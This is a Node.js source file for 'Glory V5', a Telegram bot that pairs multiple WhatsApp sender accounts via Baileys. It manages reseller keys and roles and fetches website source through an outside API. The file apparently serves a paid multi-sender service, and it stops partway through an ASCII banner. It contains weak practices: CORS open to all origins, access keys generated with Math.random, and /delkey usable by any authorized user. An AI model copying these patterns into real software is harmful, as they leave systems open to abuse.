const { Telegraf, Markup } = require("telegraf");
const fs = require('fs');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const config = require("./database/config.js");
const axios = require("axios");
const express = require('express');
const fetch = require("node-fetch"); // pastikan sudah install node-fetch
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
//const { InlineKeyboard } = require("grammy");
const { spawn } = require('child_process');
const {
default: makeWASocket,
makeCacheableSignalKeyStore,
useMultiFileAuthState,
DisconnectReason,
fetchLatestBaileysVersion,
fetchLatestWaWebVersion,
generateForwardMessageContent,
prepareWAMessageMedia,
generateWAMessageFromContent,
generateMessageTag,
generateMessageID,
downloadContentFromMessage,
makeInMemoryStore,
getContentType,
jidDecode,
MessageRetryMap,
getAggregateVotesInPollMessage,
proto,
delay
} = require("@whiskeysockets/baileys");

const { tokens, owners: ownerIds, ipvps: VPS, port: PORT } = config;
const bot = new Telegraf(tokens);
const cors = require("cors");
const app = express();

// ✅ Allow semua origin
app.use(cors());

const sessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./auth";
const file = "./database/akses.json";
const userPath = path.join(__dirname, "./database/user.json");
const userSessionsPath = path.join(__dirname, "user_sessions.json");
const userEvents = new Map(); // Map untuk menyimpan event streams per user
let userApiBug = null;
let sock;

function getCountryCode(phoneNumber) {
    const countryCodes = {
        '1': 'US/Canada',
        '44': 'UK',
        '33': 'France',
        '49': 'Germany',
        '39': 'Italy',
        '34': 'Spain',
        '7': 'Russia',
        '81': 'Japan',
        '82': 'South Korea',
        '86': 'China',
        '91': 'India',
        '62': 'Indonesia',
        '60': 'Malaysia',
        '63': 'Philippines',
        '66': 'Thailand',
        '84': 'Vietnam',
        '65': 'Singapore',
        '61': 'Australia',
        '64': 'New Zealand',
        '55': 'Brazil',
        '52': 'Mexico',
        '57': 'Colombia',
        '51': 'Peru',
        '54': 'Argentina',
        '27': 'South Africa',
        '269': 'Comoros',
        '234': 'Nigeria',
        '58': 'Venezuela'
    };

    for (const [code, country] of Object.entries(countryCodes)) {
        if (phoneNumber.startsWith(code)) {
            return country;
        }
    }
    
    return 'International';
}

function loadAkses() {
  if (!fs.existsSync(file)) {
    const initData = {
      owners: [],
      akses: [],
      resellers: [],
      pts: [],
      moderators: []
    };
    fs.writeFileSync(file, JSON.stringify(initData, null, 2));
    return initData;
  }

  // baca file
  let data = JSON.parse(fs.readFileSync(file));

  // normalisasi biar field baru tetep ada
  if (!data.resellers) data.resellers = [];
  if (!data.pts) data.pts = [];
  if (!data.moderators) data.moderators = [];

  return data;
}

function saveAkses(data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

// === Helper role ===
function isOwner(id) {
  const data = loadAkses();
  return data.owners.includes(id.toString());
}

function isAuthorized(id) {
  const data = loadAkses();
  return (
    isOwner(id) ||
    data.akses.includes(id.toString()) ||
    data.resellers.includes(id.toString()) ||
    data.pts.includes(id.toString()) ||
    data.moderators.includes(id.toString())
  );
}

function isReseller(id) {
  const data = loadAkses();
  return data.resellers.includes(id.toString());
}

function isPT(id) {
  const data = loadAkses();
  return data.pts.includes(id.toString());
}

function isModerator(id) {
  const data = loadAkses();
  return data.moderators.includes(id.toString());
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}


// === Utility ===
function generateKey(length = 4) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  return Array.from({ length }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
}

function parseDuration(str) {
  const match = str.match(/^(\d+)([dh])$/);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2];
  return unit === "d" ? value * 86400000 : value * 3600000;
}

// === User save/load ===
function saveUsers(users) {
  const filePath = path.join(__dirname, "database", "user.json");
  try {
    // Pastikan direktori database ada
    const dir = path.dirname(filePath);
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
      console.log(`✓ Created directory: ${dir}`);
    }

    // Pastikan setiap user punya role default 'user' jika tidak ada
    const usersWithRole = users.map(user => ({
      ...user,
      role: user.role || 'user'
    }));

    // Tulis file dengan format yang rapi
    fs.writeFileSync(filePath, JSON.stringify(usersWithRole, null, 2), "utf-8");
    console.log("✅  Data user berhasil disimpan. Total users:", usersWithRole.length);
    return true; // ✅ Kembalikan true jika sukses
  } catch (err) {
    console.error("✗ Gagal menyimpan user:", err);
    console.error("✗ Error details:", err.message);
    console.error("✗ File path:", filePath);
    return false; // ✅ Kembalikan false jika gagal
  }
}

function getUsers() {
  const filePath = path.join(__dirname, "database", "user.json");
  
  // Jika file tidak ada, buat file kosong
  if (!fs.existsSync(filePath)) {
    console.log(`📁 File user.json tidak ditemukan, membuat baru...`);
    const dir = path.dirname(filePath);
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
    }
    const initialData = [];
    fs.writeFileSync(filePath, JSON.stringify(initialData, null, 2), "utf-8");
    return initialData;
  }
  
  try {
    const fileContent = fs.readFileSync(filePath, "utf-8");
    
    // Handle file kosong
    if (!fileContent.trim()) {
      console.log("⚠️ File user.json kosong, mengembalikan array kosong");
      return [];
    }
    
    const users = JSON.parse(fileContent);
    
    // Pastikan setiap user punya role
    return users.map(user => ({
      ...user,
      role: user.role || 'user'
    }));
  } catch (err) {
    console.error("✗ Gagal membaca file user.json:", err);
    console.error("✗ Error details:", err.message);
    
    // Jika file corrupt, buat backup dan reset
    try {
      const backupPath = filePath + '.backup-' + Date.now();
      fs.copyFileSync(filePath, backupPath);
      console.log(`✓ Backup file corrupt dibuat: ${backupPath}`);
    } catch (backupErr) {
      console.error("✗ Gagal membuat backup:", backupErr);
    }
    
    // Reset file dengan array kosong
    const initialData = [];
    fs.writeFileSync(filePath, JSON.stringify(initialData, null, 2), "utf-8");
    console.log("✓ File user.json direset karena corrupt");
    
    return initialData;
  }
}

function loadUserSessions() {
  if (!fs.existsSync(userSessionsPath)) {
    console.log(`[SESSION] 📂 Creating new user_sessions.json`);
    const initialData = {};
    fs.writeFileSync(userSessionsPath, JSON.stringify(initialData, null, 2));
    return initialData;
  }
  
  try {
    const data = JSON.parse(fs.readFileSync(userSessionsPath, "utf8"));
    const sessionCount = Object.values(data).reduce((acc, numbers) => acc + numbers.length, 0);
    console.log(`[SESSION] 📂 Loaded ${sessionCount} sessions from ${Object.keys(data).length} users`);
    return data;
  } catch (err) {
    console.error("[SESSION] ❌ Error loading user_sessions.json, resetting:", err);
    // Reset file jika corrupt
    const initialData = {};
    fs.writeFileSync(userSessionsPath, JSON.stringify(initialData, null, 2));
    return initialData;
  }
}

const userSessionPath = (username, BotNumber) => {
  const userDir = path.join(sessions_dir, "users", username);
  const dir = path.join(userDir, `device${BotNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

function saveUserSessions(data) {
  try {
    fs.writeFileSync(userSessionsPath, JSON.stringify(data, null, 2));
    const sessionCount = Object.values(data).reduce((acc, numbers) => acc + numbers.length, 0);
    console.log(`[SESSION] 💾 Saved ${sessionCount} sessions for ${Object.keys(data).length} users`);
  } catch (err) {
    console.error("❌ Gagal menyimpan user_sessions.json:", err);
  }
}

// Function untuk mengirim event ke user
function sendEventToUser(username, eventData) {
  if (userEvents.has(username)) {
    const res = userEvents.get(username);
    try {
      res.write(`data: ${JSON.stringify(eventData)}\n\n`);
    } catch (err) {
      console.error(`[Events] Error sending to ${username}:`, err.message);
      userEvents.delete(username);
    }
  }
}

// ==================== AUTO RELOAD SESSIONS ON STARTUP ==================== //
let reloadAttempts = 0;
const MAX_RELOAD_ATTEMPTS = 3;

function forceReloadWithRetry() {
  reloadAttempts++;
  console.log(`\n🔄 RELOAD ATTEMPT ${reloadAttempts}/${MAX_RELOAD_ATTEMPTS}`);
  
  const userSessions = loadUserSessions();
  
  if (Object.keys(userSessions).length === 0) {
    console.log('💡 No sessions to reload - waiting for users to add senders');
    return;
  }
  
  console.log(`📋 Found ${Object.keys(userSessions).length} users with sessions`);
  simpleReloadSessions();
  
  // Check hasil setelah 30 detik
  setTimeout(() => {
    const activeSessionCount = sessions.size;
    console.log(`📊 Current active sessions: ${activeSessionCount}`);
    
    if (activeSessionCount === 0 && reloadAttempts < MAX_RELOAD_ATTEMPTS) {
      console.log(`🔄 No active sessions, retrying... (${reloadAttempts}/${MAX_RELOAD_ATTEMPTS})`);
      forceReloadWithRetry();
    } else if (activeSessionCount === 0) {
      console.log('❌ All reload attempts failed - manual reconnection required');
    } else {
      console.log(`✅ SUCCESS: ${activeSessionCount} sessions active`);
    }
  }, 30000);
}

// FUNCTION SANGAT SIMPLE
function simpleReloadSessions() {
  console.log('=== 🔄 SESSION RELOAD STARTED ===');
  const userSessions = loadUserSessions();
  
  if (Object.keys(userSessions).length === 0) {
    console.log('💡 No user sessions found - waiting for users to add senders');
    return;
  }

  let totalProcessed = 0;
  let successCount = 0;

  for (const [username, numbers] of Object.entries(userSessions)) {
    console.log(`👤 Processing user: ${username} with ${numbers.length} senders`);
    
    numbers.forEach(number => {
      totalProcessed++;
      const sessionDir = userSessionPath(username, number);
      const credsPath = path.join(sessionDir, 'creds.json');
      
      // Cek apakah session files ada
      if (fs.existsSync(credsPath)) {
        console.log(`🔄 Attempting to reconnect: ${number} for ${username}`);
        
        connectToWhatsAppUser(username, number, sessionDir)
          .then(sock => {
            successCount++;
            console.log(`✅ Successfully reconnected: ${number}`);
          })
          .catch(err => {
            console.log(`❌ Failed to reconnect ${number}: ${err.message}`);
          });
      } else {
        console.log(`⚠️ No session files found for ${number}, skipping`);
      }
    });
  }
  
  console.log(`📊 Reload summary: ${successCount}/${totalProcessed} sessions reconnected`);
}

const connectToWhatsAppUser = async (username, BotNumber, sessionDir) => {
  try {
    console.log(`[${username}] 🚀 Starting WhatsApp connection for ${BotNumber}`);
    
    // Kirim event connecting
    sendEventToUser(username, {
      type: 'status',
      message: 'Memulai koneksi WhatsApp...',
      number: BotNumber,
      status: 'connecting'
    });

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestWaWebVersion();

    // ✅ GUNAKAN LOGGER YANG SILENT
    const userSock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: 60000,
      connectTimeoutMs: 60000,
      keepAliveIntervalMs: 10000,
      generateHighQualityLinkPreview: true,
      syncFullHistory: false
    });

    return new Promise((resolve, reject) => {
      let isConnected = false;
      let pairingCodeGenerated = false;
      let connectionTimeout;

      const cleanup = () => {
        if (connectionTimeout) clearTimeout(connectionTimeout);
      };

      userSock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect, qr } = update;
        
        console.log(`[${username}] 🔄 Connection update:`, connection);

        if (connection === "close") {
          const statusCode = lastDisconnect?.error?.output?.statusCode;
          console.log(`[${username}] ❌ Connection closed with status:`, statusCode);

          // ❌ HAPUS DARI sessions MAP KETIKA TERPUTUS
          sessions.delete(BotNumber);
          console.log(`[${username}] 🗑️ Removed ${BotNumber} from sessions map`);

          if (statusCode === DisconnectReason.loggedOut) {
            console.log(`[${username}] 📵 Device logged out, cleaning session...`);
            sendEventToUser(username, {
              type: 'error',
              message: 'Device logged out, silakan scan ulang',
              number: BotNumber,
              status: 'logged_out'
            });
            
            if (fs.existsSync(sessionDir)) {
              fs.rmSync(sessionDir, { recursive: true, force: true });
            }
            cleanup();
            reject(new Error("Device logged out, please pairing again"));
            return;
          }

          if (statusCode === DisconnectReason.restartRequired || 
              statusCode === DisconnectReason.timedOut) {
            console.log(`[${username}] 🔄 Reconnecting...`);
            sendEventToUser(username, {
              type: 'status',
              message: 'Mencoba menyambung kembali...',
              number: BotNumber,
              status: 'reconnecting'
            });
            
            setTimeout(async () => {
              try {
                const newSock = await connectToWhatsAppUser(username, BotNumber, sessionDir);
                resolve(newSock);
              } catch (error) {
                reject(error);
              }
            }, 5000);
            return;
          }

          if (!isConnected) {
            cleanup();
            sendEventToUser(username, {
              type: 'error',
              message: `Koneksi gagal dengan status: ${statusCode}`,
              number: BotNumber,
              status: 'failed'
            });
            reject(new Error(`Connection failed with status: ${statusCode}`));
          }
        }

        if (connection === "open") {
          console.log(`[${username}] ✅ CONNECTED SUCCESSFULLY!`);
          isConnected = true;
          cleanup();
          
          // ✅ SIMPAN SOCKET KE sessions MAP GLOBAL - INI YANG PENTING!
          sessions.set(BotNumber, userSock);
          
          // ✅ KIRIM EVENT SUCCESS KE WEB
          sendEventToUser(username, {
            type: 'success',
            message: 'Berhasil terhubung dengan WhatsApp!',
            number: BotNumber,
            status: 'connected'
          });
          
          // ✅ SIMPAN KE USER SESSIONS
          const userSessions = loadUserSessions();
  if (!userSessions[username]) {
    userSessions[username] = [];
  }
  if (!userSessions[username].includes(BotNumber)) {
    userSessions[username].push(BotNumber);
    saveUserSessions(userSessions);
    console.log(`[${username}] 💾 Session saved for ${BotNumber}`);
  }
          
          resolve(userSock);
        }

        if (connection === "connecting") {
          console.log(`[${username}] 🔄 Connecting to WhatsApp...`);
          sendEventToUser(username, {
            type: 'status',
            message: 'Menghubungkan ke WhatsApp...',
            number: BotNumber,
            status: 'connecting'
          });
          
          // Generate pairing code jika belum ada credentials
          if (!fs.existsSync(`${sessionDir}/creds.json`) && !pairingCodeGenerated) {
            pairingCodeGenerated = true;
            
            // Tunggu sebentar sebelum request pairing code
            setTimeout(async () => {
              try {
                console.log(`[${username}] 📞 Requesting pairing code for ${BotNumber}...`);
                sendEventToUser(username, {
                  type: 'status',
                  message: 'Meminta kode pairing...',
                  number: BotNumber,
                  status: 'requesting_code'
                });
                
                const code = await userSock.requestPairingCode(BotNumber);
                const formattedCode = code.match(/.{1,4}/g)?.join('-') || code;
                
                console.log(`╔═══════════════════════════════════╗`);
                console.log(`║  📱 PAIRING CODE - ${username}`);
                console.log(`╠═══════════════════════════════════╣`);
                console.log(`║  Nomor Sender : ${BotNumber}`);
                console.log(`║  Kode Pairing : ${formattedCode}`);
                console.log(`╚═══════════════════════════════════╝`);
                
                // KIRIM KODE PAIRING KE WEB INTERFACE
                sendEventToUser(username, {
                  type: 'pairing_code',
                  message: 'Kode Pairing Berhasil Digenerate!',
                  number: BotNumber,
                  code: formattedCode,
                  status: 'waiting_pairing',
                  instructions: [
                    '1. Buka WhatsApp di HP Anda',
                    '2. Tap ⋮ (titik tiga) > Linked Devices > Link a Device',
                    '3. Masukkan kode pairing berikut:',
                    `KODE: ${formattedCode}`,
                    '4. Kode berlaku 30 detik!'
                  ]
                });
                
              } catch (err) {
                console.error(`[${username}] ❌ Error requesting pairing code:`, err.message);
                sendEventToUser(username, {
                  type: 'error',
                  message: `Gagal meminta kode pairing: ${err.message}`,
                  number: BotNumber,
                  status: 'code_error'
                });
              }
            }, 3000);
          }
        }

        // Tampilkan QR code jika ada
        if (qr) {
          console.log(`[${username}] 📋 QR Code received`);
          sendEventToUser(username, {
            type: 'qr',
            message: 'Scan QR Code berikut:',
            number: BotNumber,
            qr: qr,
            status: 'waiting_qr'
          });
        }
      });

      userSock.ev.on("creds.update", saveCreds);
      
      // Timeout after 120 seconds
      connectionTimeout = setTimeout(() => {
        if (!isConnected) {
          sendEventToUser(username, {
            type: 'error', 
            message: 'Timeout - Tidak bisa menyelesaikan koneksi dalam 120 detik',
            number: BotNumber,
            status: 'timeout'
          });
          cleanup();
          reject(new Error("Connection timeout - tidak bisa menyelesaikan koneksi"));
        }
      }, 120000);
    });
  } catch (error) {
    console.error(`[${username}] ❌ Error in connectToWhatsAppUser:`, error);
    sendEventToUser(username, {
      type: 'error',
      message: `Error: ${error.message}`,
      number: BotNumber,
      status: 'error'
    });
    throw error;
  }
};

bot.command("start", async (ctx) => {
  const username = ctx.from.username || ctx.from.first_name || "Unknown";

  const teks = `
<blockquote>🍁 Glory V5</blockquote>
<i>Now Glory has been updated</i>
<i>latest styles, lots of tools, and improved security system</i>

<blockquote>「 Information 」</blockquote>
<b>Developer : @ohyeahking</b>
<b>Version   : <code>2</code></b>

<i>Silakan pilih menu di bawah untuk mengakses fitur bot:</i>
`;

  const keyboard = Markup.keyboard([
    // Baris 1
    ["🔑 Settings Menu"],
    // Baris 2  
    ["ℹ️ Bot Info", "💬 Chat"],
    // Baris 3
    ["📢 Channel"]
  ])
  .resize()
  .oneTime(false);

  await ctx.reply(teks, {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
});

bot.hears("🔑 Settings Menu", async (ctx) => {
  const indictiveMenu = `
<blockquote>🍁 Glory V2</blockquote>
<i>These are some settings menu</i>

<b>🔑 Settings Menu</b>
• /connect
• /listsender
• /delsender
• /ckey
• /listkey
• /delkey
• /addowner
• /delowner
• /myrole
`;

  // Kirim pesan baru dengan inline keyboard untuk back
  await ctx.reply(indictiveMenu, {
    parse_mode: "HTML",
    reply_markup: Markup.inlineKeyboard([
      [ Markup.button.url("GLORY", "https://t.me/ohyeahking") ]
    ]).reply_markup
  });
});

bot.hears("ℹ️ Bot Info", async (ctx) => {
  const infoText = `
<blockquote>🤖 Bot Information</blockquote>
<b>Glory V5</b>
<i>Advanced multi-functional bot with enhanced security features and latest tools.</i>

<b>🔧 Features:</b>
• User Management
• Access Control
• Multi-tool Integration
• Secure Operations

<b>📞 Support:</b>
Contact @ohyeahking for assistance
`;

  await ctx.reply(infoText, {
    parse_mode: "HTML",
    reply_markup: Markup.inlineKeyboard([
      [ Markup.button.url("GLORY", "https://t.me/ohyeahking") ]
    ]).reply_markup
  });
});

bot.hears("💬 Chat", (ctx) => {
  ctx.reply("💬 Chat dengan developer: https://t.me/mizukisnji");
});

bot.hears("📢 Channel", (ctx) => {
  ctx.reply("📢 Channel updates: https://t.me/ohyeahking");
});

// Handler untuk inline keyboard (tetap seperti semula)
bot.action("show_indictive_menu", async (ctx) => {
  const indictiveMenu = `
<blockquote>🍁 Glory V5</blockquote>
<i>These are some settings menu</i>

<b>🔑 Settings Menu</b>
• /ckey
• /listkey
• /delkey
• /addowner
• /delowner
• /addreseller
• /delreseller
• /myrole
`;

  const keyboard = Markup.inlineKeyboard([
    [ Markup.button.url("GLORY", "https://t.me/ohyeahking") ]
  ]);

  await ctx.editMessageText(indictiveMenu, {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
  await ctx.answerCbQuery();
});

bot.action("show_bot_info", async (ctx) => {
  const infoText = `
<blockquote>🤖 Bot Information</blockquote>
<b>Glory V5</b>
<i>Advanced multi-functional bot with enhanced security features and latest tools.</i>

<b>🔧 Features:</b>
• User Management
• Access Control
• Multi-tool Integration
• Secure Operations

<b>📞 Support:</b>
Contact @ohyeahking for assistance
`;

  const keyboard = Markup.inlineKeyboard([
    [ Markup.button.url("GLORY", "https://t.me/ohyeahking") ]
  ]);

  await ctx.editMessageText(infoText, {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
  await ctx.answerCbQuery();
});

bot.action("back_to_main", async (ctx) => {
  const username = ctx.from.username || ctx.from.first_name || "Unknown";
  
  const teks = `
<blockquote>🍁 Glory V5</blockquote>
<i>Now Glory has been updated</i>
<i>latest styles, lots of tools, and improved security system</i>

<blockquote>「 Information 」</blockquote>
<b>Developer : @ohyeahking</b>
<b>Version   : <code>2</code></b>
<b>Username  : ${username}</b>

<i>Silakan pilih menu di bawah untuk mengakses fitur bot:</i>
`;

  const keyboard = Markup.keyboard([
    ["🔑 Settings Menu"],
    ["ℹ️ Bot Info", "💬 Chat"],
    ["📢 Channel"]
  ])
  .resize()
  .oneTime(false);

  // Edit pesan yang ada untuk kembali ke menu utama
  await ctx.editMessageText(teks, {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
  await ctx.answerCbQuery();
});

// command apalah terserah
bot.command("sessions", (ctx) => {
  const userSessions = loadUserSessions();
  const activeSessions = sessions.size;
  
  let message = `📊 **Session Status**\n\n`;
  message += `**Active Sessions:** ${activeSessions}\n`;
  message += `**Registered Users:** ${Object.keys(userSessions).length}\n\n`;
  
  Object.entries(userSessions).forEach(([username, numbers]) => {
    message += `**${username}:** ${numbers.length} sender(s)\n`;
    numbers.forEach(number => {
      const isActive = sessions.has(number);
      message += `  - ${number} ${isActive ? '✅' : '❌'}\n`;
    });
  });
  
  ctx.reply(message, { parse_mode: "Markdown" });
});

bot.command("ckey", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ")[1];

  if (!isOwner(userId)) {
    return ctx.reply("🚫 Akses ditolak. Hanya Owner yang bisa menggunakan command ini.");
  }

  if (!args || !args.includes(",")) {
    return ctx.reply("✗ Format: /ckey <username>,<durasi>,<role>\n\nContoh:\n• /ckey Mizuk,3d,admin\n• /ckey user1,7d,reseller\n• /ckey user2,1d,user\n\nRole: owner, admin, reseller, user");
  }

  const parts = args.split(",");
  const username = parts[0].trim();
  const durasiStr = parts[1].trim();
  const role = parts[2] ? parts[2].trim().toLowerCase() : 'user';

  // Validasi role
  const validRoles = ['owner', 'admin', 'reseller', 'user'];
  if (!validRoles.includes(role)) {
    return ctx.reply(`✗ Role tidak valid! Role yang tersedia: ${validRoles.join(', ')}`);
  }

  const durationMs = parseDuration(durasiStr);
  if (!durationMs) return ctx.reply("✗ Format durasi salah! Gunakan contoh: 7d / 1d / 12h");

  const key = generateKey(4);
  const expired = Date.now() + durationMs;
  const users = getUsers();

  const userIndex = users.findIndex(u => u.username === username);
  if (userIndex !== -1) {
    users[userIndex] = { ...users[userIndex], key, expired, role };
  } else {
    users.push({ username, key, expired, role });
  }

  saveUsers(users);

  const expiredStr = new Date(expired).toLocaleString("id-ID", {
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    timeZone: "Asia/Jakarta"
  });

  await ctx.reply(
    `✅ <b>Key dengan Role berhasil dibuat:</b>\n\n` +
    `<b>Username:</b> <code>${username}</code>\n` +
    `<b>Key:</b> <code>${key}</code>\n` +
    `<b>Role:</b> <code>${role.toUpperCase()}</code>\n` +
    `<b>Expired:</b> <i>${expiredStr}</i> WIB`,
    { parse_mode: "HTML" }
  );
});

bot.command("listkey", async (ctx) => {
  const userId = ctx.from.id.toString();
  const users = getUsers();

  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }

  if (users.length === 0) return ctx.reply("💢 No keys have been created yet.");

  let teks = `🟢 Active Key List:\n\n`;

  users.forEach((u, i) => {
    const exp = new Date(u.expired).toLocaleString("id-ID", {
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      timeZone: "Asia/Jakarta"
    });
    teks += `${i + 1}. ${u.username}\nKey: ${u.key}\nRole: ${u.role || 'user'}\nExpired: ${exp} WIB\n\n`;
  });

  await ctx.reply(teks);
});

bot.command("delkey", (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ❗ ] - Akses hanya untuk Owner - tidak bisa sembarang orang bisa mengakses fitur ini.");
  }
  
  if (!username) return ctx.reply("❗Enter username!\nExample: /delkey shin");

  const users = getUsers();
  const index = users.findIndex(u => u.username === username);
  if (index === -1) return ctx.reply(`✗ Username \`${username}\` not found.`, { parse_mode: "HTML" });

  users.splice(index, 1);
  saveUsers(users);
  ctx.reply(`✓ Key belonging to ${username} was successfully deleted.`, { parse_mode: "HTML" });
});

bot.command("myrole", (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.from.username || ctx.from.first_name || "User";
  
  let role = "User";
  if (isOwner(userId)) {
    role = "Owner";
  } else if (isModerator(userId)) {
    role = "Admin";
  } else if (isReseller(userId)) {
    role = "Reseller";
  } else if (isAuthorized(userId)) {
    role = "Authorized User";
  }
  
  ctx.reply(`
👤 <b>Role Information</b>

🆔 <b>User:</b> ${username}
🎭 <b>Bot Role:</b> ${role}
💻 <b>User ID:</b> <code>${userId}</code>

<i>Gunakan /ckey di bot untuk membuat key dengan role tertentu (Owner only)</i>
  `, { parse_mode: "HTML" });
});

bot.command("addreseller", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];

  if (!isOwner(userId) && !isPT(userId) && !isModerator(userId)) {
    return ctx.reply("🚫 Akses ditolak.");
  }
  if (!id) return ctx.reply("Usage: /addreseller <id>");

  const data = loadAkses();
  if (data.resellers.includes(id)) return ctx.reply("✗ Already a reseller.");

  data.resellers.push(id);
  saveAkses(data);
  ctx.reply(`✓ Reseller added: ${id}`);
});

bot.command("delreseller", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];

  if (!isOwner(userId)) {
    return ctx.reply("🚫 Akses ditolak.");
  }
  if (!id) return ctx.reply("Usage: /delreseller <id>");

  const data = loadAkses();
  data.resellers = data.resellers.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✓ Reseller removed: ${id}`);
});
/* simpen aja dlu soalnya ga guna
bot.command("addacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }
  
  if (!id) return ctx.reply("✗ Format salah\n\nExample : /addacces 7066156416", { parse_mode: "HTML" });

  const data = loadAkses();
  if (data.akses.includes(id)) return ctx.reply("✓ User already has access.");

  data.akses.push(id);
  saveAkses(data);
  ctx.reply(`✓ Access granted to ID: ${id}`);
});

bot.command("delacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }
  
  if (!id) return ctx.reply("✗ Format salah\n\nExample : /delacces 7066156416", { parse_mode: "HTML" });

  const data = loadAkses();
  if (!data.akses.includes(id)) return ctx.reply("✗ User not found.");

  data.akses = data.akses.filter(uid => uid !== id);
  saveAkses(data);
  ctx.reply(`✓ Access to user ID ${id} removed.`);
});*/

bot.command("addowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }
  
  if (!id) return ctx.reply("✗ Format salah\n\nExample : /addowner 7066156416", { parse_mode: "HTML" });

  const data = loadAkses();
  if (data.owners.includes(id)) return ctx.reply("✗ Already an owner.");

  data.owners.push(id);
  saveAkses(data);
  ctx.reply(`✓ New owner added: ${id}`);
});

bot.command("delowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }
  if (!id) return ctx.reply("✗ Format salah\n\nExample : /delowner 7066156416", { parse_mode: "HTML" });

  const data = loadAkses();

  if (!data.owners.includes(id)) return ctx.reply("✗ Not the owner.");

  data.owners = data.owners.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✓ Owner ID ${id} was successfully deleted.`);
});

bot.command("getcode", async (ctx) => {
    const chatId = ctx.chat.id;
    const input = ctx.message.text.split(" ").slice(1).join(" ").trim();

    if (!input) {
        return ctx.reply("❌ Missing input. Please provide a website URL.\n\nExample:\n/getcode https://example.com");
    }

    const url = input;

    try {
        const apiUrl = `https://api.nvidiabotz.xyz/tools/getcode?url=${encodeURIComponent(url)}`;
        const res = await fetch(apiUrl);
        const data = await res.json();

        if (!data || !data.result) {
            return ctx.reply("❌ Failed to fetch source code. Please check the URL.");
        }

        const code = data.result;

        if (code.length > 4000) {
            // simpan ke file sementara
            const filePath = `sourcecode_${Date.now()}.html`;
            fs.writeFileSync(filePath, code);

            await ctx.replyWithDocument({ source: filePath, filename: `sourcecode.html` }, { caption: `📄 Full source code from: ${url}` });

            fs.unlinkSync(filePath); // hapus file setelah dikirim
        } else {
            await ctx.replyWithHTML(`📄 Source Code from: ${url}\n\n<code>${code}</code>`);
        }
    } catch (err) {
        console.error("GetCode API Error:", err);
        ctx.reply("❌ Error fetching website source code. Please try again later.");
    }
});

console.clear();
console.log(chalk.bold.white(`\n
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢠⠄⠀⡐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡈⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠄⠀⠀⠀⠀⠈⠙⠢⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⡶⠦⣠⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠈⣟⠲⡎⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡰⢃⡠⠋⣠⠋
